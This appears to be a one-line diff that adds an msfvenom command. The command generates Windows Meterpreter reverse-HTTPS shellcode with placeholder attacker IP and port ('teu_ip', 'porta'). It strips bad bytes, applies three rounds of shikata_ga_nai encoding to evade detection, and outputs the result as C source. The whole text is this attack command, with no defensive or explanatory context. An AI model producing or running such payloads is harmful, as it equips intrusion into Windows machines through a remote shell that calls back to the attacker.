@@ -1,0 +1,1 @@
+ msfvenom -p windows/meterpreter/reverse_https LHOST=teu_ip LPORT=porta -b '\x00\xff' -e x86/shikata_ga_nai -i 3 -f c
